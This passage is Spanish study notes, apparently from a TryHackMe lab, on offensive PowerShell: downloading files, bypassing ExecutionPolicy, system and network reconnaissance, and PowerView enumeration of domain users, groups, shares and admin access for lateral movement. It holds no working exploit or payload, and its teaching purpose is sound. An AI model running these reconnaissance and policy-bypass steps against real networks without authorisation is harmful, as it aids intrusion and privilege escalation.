	<img src="{{ 'assets/img/THM/Pasted image 20220913182013.png' | relative_url }}" text-align="center"/>
</div>

- *Get-Content*: Se utiliza para mostar el contenido de un fichero.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913182100.png' | relative_url }}" text-align="center"/>
</div>

- *Copy/Move/Remove-Item*: Para copiar, mover o borrar archivos siempre y cuando se tenga permiso para ello:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913182146.png' | relative_url }}" text-align="center"/>
</div>

- *Get-FileHash*: Para obtener el Hash del contenido de un fichero. Se ha de tener en cuenta que hay que especificar el algoritmo de hash:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913182412.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Downloading files**

Existen numerosas formas de descargar ficheros usando PowerShell, a través de un servidor de python:

```powershell
python3 -m http.server 8888
```

Y luego aplicando desde la máquina cliente el cmdlet *Invoke-WebRequest* o alguno similar

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913183152.png' | relative_url }}" text-align="center"/>
</div>

Se recomienda buscar en google formas de descargar ficheros en Powershell.

Una vez se ha descargado el fichero, conviene revisar el ExecutionPolicy mediante el cmdlet *Get-ExecutionPolicy -list* el cual lista una serie de reglas predefinidas para ejecutar binarios en el sistema, no se trata de una medida de seguridad y puede ser fácilmente bypasseado por el usuario como por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913183604.png' | relative_url }}" text-align="center"/>
</div>

Aunque algunos métodos requeriran de permisos de adminstrador.

<br />

**System Reconnaissance**

Powershell tiene incorporados algunos scripts que permiten a un usuario realizar una tarea de reconocimiento en el sistema:

*Get-HotFix*: Nos permite enumerar actualizaciones o parches de seguridad.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913184019.png' | relative_url }}" text-align="center"/>
</div>

Para mayor eficencia podemos combinar modificadores para adaptar el formato del output a una lista y luego filtrar el resultado con por ejemplo el comando:

```powershell
Get-HotFix | Format-list | findstr <pattern>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913184210.png' | relative_url }}" text-align="center"/>
</div>

Observemos que por defecto muchos cmdlet muestran con un formato tabla que no admite el filtrado de términos de forma cómoda. En este sentido es muy útil el cmd-let *Format-list*, otros ejemplos serían:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913184317.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913184324.png' | relative_url }}" text-align="center"/>
</div>

También podemos utilizar *Out-File* para enviar el output a un fichero.

<br />

**Network Reconnaissance**

Con powershell podemos emplear comandos que puedan enviar un paquete ICMP (ping) a un rango de direcciones IP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913184725.png' | relative_url }}" text-align="center"/>
</div>

Podemos optimizar este resultado enviando los errores a "null" añadiendo una redirección de error: *2>$null* como hacíamos en Linux.

<br />

**PowerView**

Powerview es uno de las formas más efectivas de recopilar información sobre el dominio. Este módulo puede ser descargado desde el siguiente [enlace](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) Recordamos que debemos de tener en cuenta el bypass de la ExecutionPolicy para ser capaz de ejecutar el script.

Powerview es un módulo que añade al entorno del usuario un conjunto de cmdlets que ayudan a la recopilación de información del sistema. Así, lo que hacemos es importar dichos comandos con el témrino Import-Module:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913185806.png' | relative_url }}" text-align="center"/>
</div>

De esta forma ya estaremos en disposición de utilizar los siguientes comandos:

- *Get-NetDomainController*: Este comando recopila información sobre el domain controller.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913185653.png' | relative_url }}" text-align="center"/>
</div>

- *Get-NetUser*: Este comando proporcionará una lista de *domain users*. El output puede ser complicado de leer, con lo que conviene filtrarlo o bien con *out-gridview* o por atributos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913190016.png' | relative_url }}" text-align="center"/>
</div>

O directamente utilizar el *pipe* para filtar determinados términos o propiedades:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913190154.png' | relative_url }}" text-align="center"/>
</div>

- *Get-NetComputer*: Este comando sirve para enumerar sistemas contectados al dominio. Si añadimos le modificador *-ping* enumeraremos aquellos sistemas que están actualmente online.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913191802.png' | relative_url }}" text-align="center"/>
</div>

- *Get-NetGroup/Get-NetGroupMember*: Algunas cuentas son miembros de grupos importantes como el dominio de los administradores. El cmdlet Get-NetGroup puede ayudarnos a enumerar grupos existentes e información sobre los mismos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913191908.png' | relative_url }}" text-align="center"/>
</div>

Podemos filtar términos para obtener una lista de todos los Grupos

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913192923.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente buscar información específica de un grupo o directamente listar los miembros de dicho grupo con Get-NetGroupMember:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913193031.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Finding Shares*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913193118.png' | relative_url }}" text-align="center"/>
</div>

- *Enumerate Group Policy*: La política de grupos se utiliza para configurar ordenadores conectados a un dominio. El cmdlet se emplea para *Get-NetGPO* para recopilar inforamción sobre políticas forzadas.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220913201404.png' | relative_url }}" text-align="center"/>
</div>

- *User Enumeration*: Saber que usuarios tienen privilegios de administrador puede facilitar la escalada lateral de privilegios.

Para ello empleamos el cmdlet Find-LocalAdminAccess.

